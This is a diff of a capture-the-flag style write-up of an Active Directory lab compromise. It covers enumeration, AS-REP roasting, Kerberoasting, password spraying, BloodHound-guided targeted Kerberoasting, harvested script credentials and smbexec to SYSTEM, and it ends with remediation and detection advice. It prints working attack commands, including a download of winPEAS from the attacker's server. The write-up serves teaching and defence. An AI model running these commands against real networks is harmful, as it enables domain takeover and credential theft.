@@ -48,6 +48,7 @@ I proceeded to perform **SMB enumeration** as the guest user, using netexec tool
 nxc smb AD.thm.local -u 'guest' -p '' --shares
 ```
 <img width="968" height="547" alt="smb-enum" src="https://github.com/user-attachments/assets/f280b951-01b5-4b74-a281-5b775283907e" />
+
 Null SMB session confirmed, with IPC$ readable and the standard ADMIN$, C$, NETLOGON, and SYSVOL shares visible — all expected for a DC, no immediately readable loot on SYSVOL/NETLOGON this pass.
 
 ### RID cycling
@@ -90,14 +91,17 @@ nxc ldap AD.thm.local -u <username-list> -p '' --asreproast
 ```
 pipe the output in a file (e.g. asrep_hashes.txt)
 <img width="982" height="637" alt="asrep-roasting" src="https://github.com/user-attachments/assets/66135c6c-dfe9-457f-bfe1-4b4bd0565b66" />
+
 Now we got a list of hashes of accounts with **Do not require Kerberos pre-authentication** enabled which are crackable offline. Using hashcat or jhon, we can try to crack these hashes.
 ```bash
 hashcat -a 0 -m 18200 users.txt /path/to/wordlist.txt
 ```
 The **rockyou.txt** wordlist failed to crack the hashes
 <img width="977" height="612" alt="rockyou-failed" src="https://github.com/user-attachments/assets/31f04d54-d1c3-47d4-9a1f-c3b73d4fbaab" />
+
 So now I proceeded to use another wordlist -> **xato-net-10-million-passwords.txt**
 <img width="1022" height="463" alt="xato-10mill-failed" src="https://github.com/user-attachments/assets/dbc3f4f2-115d-45dc-ae17-bdcc0b0f2c16" />
+
 And as expected, I was unable to crack them...
 
 ### Kerberoasting
@@ -125,6 +129,7 @@ xfreerdp3 /v:<machine-ip> /u:CODY_ROY /p:REDACTED
 ```
 I then used **RDP** to enumerate as CODY_ROY, but the environment was restricted. Hence, I figured out to use `Win + R` to open cmd prompt.
 <img width="1523" height="861" alt="codyroy_rdp" src="https://github.com/user-attachments/assets/7930caeb-4953-451e-a542-3e84b72416ec" />
+
 I did manual enumeration work but didn't have any luck, so I decided to get **WinPEAS.exe** onto the target machine. So I created a python server on my host machine
 ```bash
 python3 -m http.server
@@ -135,6 +140,7 @@ Invoke-WebRequest -Uri "http://<attackbox-ip:port>/winPEAs.exe" -OutFile "C:\Use
 ```
 But the target machine is guarded by Windows Defender, and Windows Defender just blocked the execution.
 <img width="958" height="450" alt="winpeas-failed" src="https://github.com/user-attachments/assets/df4a243d-f9ee-4678-beec-771cface33c6" />
+
 I could've tried getting winPEAS.ps1 instead, but then the process would've become more tedious, hence why I decided to go for Bloodhound collection.
 
 ### Password spraying
@@ -166,6 +172,7 @@ BloodHound collection output zip Collection completed, producing a timestamped b
 ### Bloodhound Analysis
 **ZACHARY_HUNT** BloodHound graph **ZACHARY_HUNT** holds no privileged group membership on his own, but his Outbound Object Control (13 edges) includes a direct `GenericWrite` onto **JERRI_LANCASTER**, plus broader `GenericWrite` reach inherited through the `EVERYONE` group over a dozen other accounts.
 <img width="1604" height="872" alt="zachary_hunt_graph" src="https://github.com/user-attachments/assets/6115e3ef-7adc-4bab-a0d3-6791b549dddd" />
+
 It was obvious who our next target was.
 
 ### Targeted Kerberoasting
@@ -179,11 +186,150 @@ python3 targetedKerberoast.py -d 'thm.local' -u 'ZACHARY_HUNT' -p 'REDACTED' --r
 ```
 <img width="910" height="257" alt="jerri_targeted_kerberoast" src="https://github.com/user-attachments/assets/77a19893-db13-4af6-bb47-0f9f5200613f" />
 
-Targeted Kerberoast against **JERRI_LANCASTER** A valid $krb5tgs$23$ ticket hash was returned directly — the SPN write, ticket request, and (implicit) cleanup all happened in one shot via the `GenericWrite` right.
+Targeted Kerberoast against **JERRI_LANCASTER**. A valid $krb5tgs$23$ ticket hash was returned directly — the SPN write, ticket request, and (implicit) cleanup all happened in one shot via the `GenericWrite` right.
+
+Now I could easily crack JERRI's hash offline using hashcat
+```bash
+hashcat -a 0 -m 13100 jerri_hash.blob /path/to/rockyou.txt
+```
+<img width="648" height="544" alt="jerri_kb_hash_cracked" src="https://github.com/user-attachments/assets/c2fe89d1-c034-4ff0-adce-a781206e5650" />
+
+And we were able to crack the hash and retrieve the password! Targeted kerberoasting worked.
+
+Jerri Lancaster SMB share enumeration Authentication succeeded Share access was limited to READ on IPC$, NETLOGON, and SYSVOL — no admin rights yet, but enough to log in interactively.
+```bash
+nxc smb AD.thm.local -u JERRI_LANCASTER -p 'REDACTED' --shares
+```
+<img width="912" height="522" alt="jerri_shares_enum" src="https://github.com/user-attachments/assets/cbbe496a-495a-48c1-994b-bc2b434be77d" />
+
+### Access as JERRI_LANCASTER
+Whoami confirmed we have access as JERRI_LANCASTER
+<img width="1025" height="634" alt="jerri_rdp" src="https://github.com/user-attachments/assets/a98564d4-2c87-49a6-a76c-c52a9da74a05" />
+
+After a lil enumeration, I found out that `C:\Scripts` was now accessible, by this user. On viewing the directory, I found out that there is a powershell script stored `syncer.ps1`
+```PowerShell
+type syncer.ps1
+```
+<img width="960" height="398" alt="acess_scripts_directory" src="https://github.com/user-attachments/assets/48267f8c-360c-429c-837d-a56a57ec855a" />
+
+We found the credentials to **SANFORD_DAUGHERTY** user!
+
+## SYSTEM access
+### Bloodhound Analysis
+<img width="1642" height="990" alt="sanford_graph" src="https://github.com/user-attachments/assets/c120baaa-978d-4275-818d-c07b8693b07b" />
+
+**SANFORD_DAUGHERTY** BloodHound node account's Member Of list (11 groups) includes `ADMINISTRATORS@THM.LOCAL` and, critically, `DOMAIN ADMINS@THM.LOCAL` directly — alongside an enormous **777 Outbound Object Control** edges. This single account effectively is Domain Admin, no further privilege escalation required.
+
+### SMB enumeration
+<img width="921" height="548" alt="sanford_shares_enum" src="https://github.com/user-attachments/assets/31bb60fa-a0eb-45d2-86be-530443da7917" />
+
+Performing SMB enum with **SANFORD_DAUGHERTY** credentials, we can see that it is indeed a Domain Admin(we can see Pwn3d! indicating that we have compromised the Domain Admin) full READ,WRITE access across ADMIN$, C$, NETLOGON, and SYSVOL, confirming local admin rights on the DC.
+
+### Access as SANFORD_DAUGHERTY
+```bash
+xfreerdp3 /v:<dc-ip> /u:SANFORD_DAUGHERTY /p:REDACTED
+```
+RDP into **SANFORD_DAUGHERTY** account, the environment was restricted again, and we spawned without Admin privileges.
+<img width="1020" height="689" alt="spawned_as_non-admin" src="https://github.com/user-attachments/assets/8aa0d2a6-23cc-44ac-a6f0-a9897345119a" />
+
+I was trying to spawn the shell in Administrator context, however I took me a lot of fighting with the UAC. You can simply do it by pressing `Ctrl + Shift + Enter`, but due to some issue, I was unable to figure out, why it wasn't letting me do it.
+Then I decided to use `smbexec.py` instead to spawn the shell in **SYSTEM** context.
+```bash
+smbexec.py 'thm.local/SANFORD_DAUGHERTY:REDACTED@AD.thm.local'
+```
+smbexec shell as **NT AUTHORITY\SYSTEM** whoami now returns **nt authority\system** — full SYSTEM-level access on the Domain Controller.
+<img width="917" height="191" alt="got_SYSTEM32" src="https://github.com/user-attachments/assets/9809f0ca-f710-48a4-af3a-7313a455a213" />
+
+## Retrieving the flag
+```cmd
+type C:\Users\Administrator\Desktop\flag.txt.txt
+```
+This will retrieve the flag successfully. We have successfully exploited the Active Directory environment.
+<img width="777" height="69" alt="flag" src="https://github.com/user-attachments/assets/99846f0c-9aae-427d-8428-8557ad590f56" />
+
+## Full Attack Chain
+
+<details>
+<summary><strong>Full Attack Path (click to expand)</strong></summary>
 
 
+```
+nmap recon → DC fingerprinted (thm.local)
+        ↓
+Anonymous LDAP/SMB → 331 users enumerated, RID cycling cross-check
+        ↓
+AS-REP Roast → 5 hashes, uncracked (rockyou + xato both missed)
+        ↓
+Kerberoast sweep → CODY_ROY hash → cracked with rockyou
+        ↓
+Password spray (Cody's pw) → hit on ZACHARY_HUNT
+        ↓
+BloodHound collection
+        ↓
+Zachary Hunt --[GenericWrite]--> Jerri Lancaster
+        ↓
+Targeted Kerberoast on Jerri → cracked TGS hash
+        ↓
+RDP as Jerri → found plaintext creds in C:\Scripts\syncer.ps1
+        ↓
+SANFORD_DAUGHERTY (member of DOMAIN ADMINS directly)
+        ↓
+smbexec.py as Sanford → NT AUTHORITY\SYSTEM
+        ↓
+Flag captured on Administrator's Desktop
+```
 
 
+</details>
+
+## Remediation Steps
+
+**Anonymous LDAP / SMB Enumeration**
+Disable anonymous/null session access to LDAP and SMB:
+RestrictAnonymous = 2 via Group Policy (Network access: Do not allow anonymous enumeration of SAM accounts and shares)
+Enforce LDAP signing and channel binding (ldapenforcechannelbinding, LDAPServerIntegrity) — this would have blocked the easy 331-user dump entirely.
+Disable the Guest account domain-wide if not explicitly required.
+
+**RID Cycling**
+Covered by the same RestrictAnonymous fix above — null-session RID brute-forcing relies on anonymous SAM lookups being allowed.
+
+**AS-REP Roasting**
+Audit all accounts for Do not require Kerberos preauthentication and disable it unless there’s a specific legacy requirement.
+Enforce strong, unique passwords on any account that must remain pre-auth-exempt — AS-REP hashes are only useful if the password is weak.
+
+**Kerberoasting**
+Minimize SPNs on user accounts; move service accounts to Group Managed Service Accounts (gMSA), which rotate their own 120+ character passwords automatically and aren’t practically crackable.
+Where gMSA isn’t feasible, enforce 25+ character random passwords on any SPN-bearing account.
+Monitor for Event ID 4769 (Kerberos service ticket requests) with RC4 encryption (etype 0x17) — a strong Kerberoasting indicator, since legitimate traffic should mostly use AES.
+
+**Password Reuse / Spraying**
+Enforce unique passwords per account via policy and user education — this one pivot (Cody → Zachary) opened the rest of the chain.
+Implement account lockout policies tuned to block sprays without causing mass DoS (e.g., lockout after 5 attempts within a rolling window).
+Deploy Azure AD Password Protection / banned password lists to catch weak or reused patterns domain-wide.
+
+**Excessive ACL Grants (GenericWrite / WriteOwner)**
+Run regular BloodHound audits against production AD — this is the exact tool that surfaced the GenericWrite path here, and it works identically for defenders.
+Apply least-privilege ACLs: no standard user account should hold GenericWrite, GenericAll, or WriteOwner over other user objects unless there’s a specific delegated admin function requiring it.
+Use AdminSDHolder protection correctly and audit Tier Zero objects for unexpected inbound/outbound control edges.
+
+**Plaintext Credentials in Scripts**
+Never hardcode credentials in .ps1/.bat/automation scripts. Use:
+gMSA for scheduled tasks and services
+A credential vault (Azure Key Vault, CyberArk, HashiCorp Vault, Windows Credential Manager with DPAPI)
+Restrict read access on directories like C:\Scripts to only the accounts/service that need it — this script was readable by a standard low-privilege session.
+Rotate any credential with a name/comment suggesting it was “temporary” (RESET_ASAP123 is a textbook example of a password that should never have persisted).
+
+**Over-Privileged Service Accounts**
+Audit Domain Admins / Administrators membership regularly — a credential meant for a narrow sync automation task had no business sitting directly in Domain Admins.
+Apply the principle of least privilege: create a dedicated, narrowly-scoped account/role for AD replication tasks (e.g., delegate just Replicating Directory Changes rights) instead of granting full Domain Admin.
+
+**General Detection & Response**
+Enable and monitor:
+4768/4769 (Kerberos ticket requests) for roasting patterns
+4624/4625 (logon success/failure) for spray detection
+5136/5141 (AD object/ACL modifications) for GenericWrite/WriteOwner abuse in real time
+Deploy a SIEM rule for anomalous smbexec/wmiexec/psexec-style service creation (Event ID 7045) — this was the final technique used to get SYSTEM.
+Consider tiered administration (Tier 0/1/2 model) so that a compromised lower-tier credential can never reach Domain Admin equivalence, regardless of what gets found on disk.
 
 
 
